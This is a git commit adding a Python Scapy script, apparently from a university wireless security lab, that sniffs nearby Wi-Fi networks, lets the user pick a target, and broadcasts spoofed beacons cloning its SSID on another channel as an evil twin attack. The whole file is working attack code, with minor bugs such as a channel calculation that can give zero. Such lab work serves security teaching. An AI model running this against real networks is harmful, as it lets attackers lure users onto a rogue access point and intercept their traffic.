22c6d5b691888c5536b1bc74e90e181e3bbedc72
Mehdi Salhi <mehdi.salhi@heig-vd.ch>
2023-03-30 07:41:02 +0200

    Rename scripts and add headers and comments

---
+++ scripts/2_evil_tween.py
@@ -0,0 +1,74 @@
+"""
+Titre: 2_evil_tween
+Sujet: HEIGVD-SWI23-Labo1-MAC-Sec
+Description:
+    - Dresse une liste des SSID disponibles à proximité
+    - Présente à l'utilisateur la liste, avec les numéros de canaux et les
+      puissances
+    - Permet à l'utilisateur de choisir le réseau à attaquer
+    - Génère un beacon concurrent annonçant un réseau sur un canal différent se
+      trouvant à 6 canaux de séparation du réseau original
+Auteurs:
+    - Anthony Coke
+    - Guilain Mbayo
+    - Mehdi Salhi
+Date: 30.03.2023
+"""
+
+#!/usr/bin/env python
+
+from scapy.all import *
+
+# Fonction appelée sur chaque paquet sniffé
+# Stock chaque réseau avec SSID unique dans un dictionnaire
+def pkt_handler(pkt):
+    network = []
+    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+        try:
+            #if pkt.type== 0 and pkt.subtype == 8:
+            if pkt.info not in ap_list and len(pkt.info) > 0:
+                ssid = pkt[Dot11Elt].info
+                bssid = pkt[Dot11].addr3
+                channel = int(ord(pkt[Dot11Elt:3].info))
+                power = pkt.dBm_AntSignal
+                network = [bssid, channel, power]
+                ap_list[ssid] = network
+        except AttributeError:
+            pass
+
+# Génère un beacon concurrent
+def generate_concurrent_beacon(target_ssid, target_infos):
+    # Calcul du canal pour le beacon concurrent (6 canaux de séparation du canal
+    # du réseau cible)
+    concurrent_channel = (target_infos[1] + 6) % 15
+
+    # Création de la trame Beacon concurrente avec le même SSID que la cible sur
+    # un canal différent
+    packet = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap='ESS+privacy')/Dot11Elt(ID='SSID', info=target_ssid.encode())/Dot11Elt(ID='DSset', info=chr(concurrent_channel))
+
+    # Envoi de la trame Beacon concurrente
+    sendp(packet, iface='wlan0mon', inter=0.1, verbose=1)
+
+
+# List des AP
+ap_list = {}
+
+def main():
+
+    # Sniff les paquets pour détecter les AP
+    print("Sniffing en cours...")
+    sniff(count = 100, timeout=5, iface="wlan0mon", prn = pkt_handler)
+
+    # Affiche les AP détéctés
+    print("SSID :: BSSID :: Canal :: Puissance")
+    for ap in ap_list:
+        print(ap.decode(), ap_list[ap])
+
+    target_ssid = input("Réseau à attaquer: ")
+
+    print(ap_list[target_ssid.encode()])
+
+    generate_concurrent_beacon(target_ssid, ap_list[target_ssid.encode()])
+
+if __name__ == "__main__":
+    main()
